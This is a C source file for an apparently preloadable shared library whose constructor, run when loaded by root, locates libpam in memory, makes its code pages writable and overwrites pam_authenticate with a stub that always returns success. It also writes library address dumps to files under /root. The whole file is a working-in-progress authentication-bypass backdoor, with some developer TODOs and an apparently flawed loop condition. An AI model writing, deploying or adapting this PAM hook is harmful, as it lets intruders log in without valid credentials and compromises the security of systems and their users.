#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>

#include <security/pam_appl.h>
#include <sys/mman.h>

#include <dlfcn.h>
#include <link.h>

#include "bad.h"

void handlesigsegv(int sig)
{
	//TODO
	//unregister us
	signal(sig, SIG_DFL);
	kill(getpid(), sig);
}

int retzero(pam_handle_t *x, int i)
{
	return 0;
}

static int
callback(struct dl_phdr_info *info, size_t size, void *data)
{
	int j;
	FILE *fp = fopen("/root/asd", "a+");

	fprintf(fp, "name=%s (%d segments)\n", info->dlpi_name,
			info->dlpi_phnum);

	for (j = 0; j < info->dlpi_phnum; j++) {
		fprintf(fp, "\t\theader %2d: addr=%10p - offset=%d - vaddr=%p - paddr=%p - filesz=%llu - memsz=%llu - align=%llu\n",
					 j,  (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr),info->dlpi_phdr[j].p_offset, info->dlpi_phdr[j].p_vaddr, info->dlpi_phdr[j].p_paddr, 
					info->dlpi_phdr[j].p_filesz, info->dlpi_phdr[j].p_memsz, info->dlpi_phdr[j].p_align);
	}
	fflush(fp);
	fclose(fp);
	return 0;
}


/* 
 * libs should always be(?)loaded page aligned. 
 *   Get the distance of the function(dli->dli_saddr) to be hooked from this page aligned lib(map->l_addr)
 *   and round up to the next page and use this value for mprotect()
 *
 * there is still an extra mapping in /proc/$pid/maps ... not sure how big of a problem this is
 * FIXME: the stack frame SHOULD get fixed for us, it does on my system at least
 *
 * long long int prevpage = ((long long int) dli->dli_saddr / PAGE_SIZE) * PAGE_SIZE;
 * long long int nextpage = (((long long int) dli->dli_saddr / PAGE_SIZE) + 1) * PAGE_SIZE;
 *
 */
int hook(void *lib, void *func, void *replace, size_t replacelen)
{
	int PAGE_SIZE = getpagesize();
	
	long long int distance = (long long int) func - (long long int)lib;
	long long int PAGES = ((long long int) distance / PAGE_SIZE) + 1;				

	size_t len = PAGE_SIZE * PAGES;
	mprotect((void *) lib, len, PROT_READ | PROT_WRITE | PROT_EXEC);
	
	memcpy(func, replace, replacelen); /* known good--4 byte alignment(? - retzero() is 17 bytes according to objdump?) */
	
	mprotect((void *) lib, len, PROT_READ | PROT_EXEC);

	return 0;
}


 __attribute__((constructor)) void bad(void) 
{
	if (getuid() != 0) //TODO FIX: this will break userspace crap otherwise
		return;

	/* get handles to dlinfo() and dladdr() because lazy */	
	void *dlhandle = dlopen("libdl-2.13.so", RTLD_NOW);
	dlinfoptr = dlsym(dlhandle, "dlinfo");
	dladdrptr = dlsym(dlhandle, "dladdr");
	dl_iterate_phdrptr = dlsym(dlhandle, "dl_iterate_phdr");
	dlclose(dlhandle);

	FILE *fp;
	fp = fopen("/root/asf", "w+");
	
	struct link_map *map;
	void *ourhandle = dlopen(NULL, 	RTLD_NOW);
	dlinfoptr(ourhandle, 2, &map);

	Dl_info *dli = malloc(sizeof(Dl_info));
	
	signal(SIGSEGV, handlesigsegv);

	/* we have a map of all loaded libraries, 
	 * now iterate through them until we get to an interesting one (libpam)
	 * take libpam's load address and check for interesting function pointers using dladdr()
	 */
	while (map != NULL) { 
		fprintf(fp, "%p : %s\n", (void *)map->l_addr, map->l_name);
		if (strstr(map->l_name, "libpam.so.0") != NULL) {
			void *libstart = (void *)map->l_addr; // libpam loaded here -- confirm /proc/$PID/maps 
			
			void *libend = (void *)map->l_next->l_addr; 
		
			bool done = false;
			while (done != true && libstart >= libend) {  
				dladdrptr(libstart, dli);
					
				if (dli->dli_sname != NULL && dli->dli_saddr != NULL) {
					if (strcmp(dli->dli_sname, "pam_authenticate") == 0) {
						/*
						fprintf(fp, "got pam_authenticate @ %p\n", dli->dli_saddr);
						dl_iterate_phdrptr(callback, NULL);
						fflush(fp);
						*/
						
						int ret = hook((void *)map->l_addr, dli->dli_saddr, retzero, 20);
						
						done = true;
					}
				}
				libstart += 16; // XXX: testme += 64
			}	
		}
		map = map->l_next;
	} 
	fclose(fp);
	
	return;
}
